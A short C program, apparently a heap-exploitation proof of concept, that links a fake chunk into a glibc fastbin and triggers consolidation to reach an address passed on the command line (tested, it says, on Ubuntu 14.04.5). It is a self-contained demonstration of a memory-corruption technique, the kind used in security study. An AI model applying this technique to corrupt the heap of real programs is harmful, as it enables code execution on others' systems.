#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

/*
 * Tested on Ubuntu 14.04.5 LTS, won't work on 16.04
 */
int main(int argc, const char* argv[]) {
	void *addr;
    
    if (argc != 2) {
        printf("I need &check_action as arg\n");
        return 666;
    }

    size_t check_a = strtoull(argv[1], 0, 16);

	malloc(1);
	size_t *chunk = (size_t *)malloc(0x10);
	malloc(0x10);

    free(chunk);
    // emulate corruption, link fake chunk into fastbin
    chunk[0] = check_a - 0x18;

    malloc(1024); // trigger consolidation
	return 0;
}
